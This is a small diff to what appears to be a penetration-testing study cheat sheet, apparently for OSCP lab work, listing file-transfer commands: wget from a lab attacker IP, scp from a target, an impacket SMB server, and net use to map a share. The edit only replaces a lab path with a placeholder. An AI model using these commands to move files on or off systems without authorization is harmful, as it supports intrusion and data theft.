@@ -39,7 +39,7 @@ wget -P <OutputLocation> "http://10.10.14.3/<Filename> > <After-Filename>"
 scp <username>@<target>:<FilePath> <StrageLocation>
 ~~~
 ~~~
-impacket-smbserver -username kali -password kali -ip 10.10.14.3 -port 445 share /home/kali/Desktop/OSCP/challenge/lab2/14 -smb2support
+impacket-smbserver -username kali -password kali -ip 10.10.14.3 -port 445 share /home/kali/<path> -smb2support
 ~~~
 ~~~
 "net use \\<IP>\<ShareName> /user:<user> <pass>
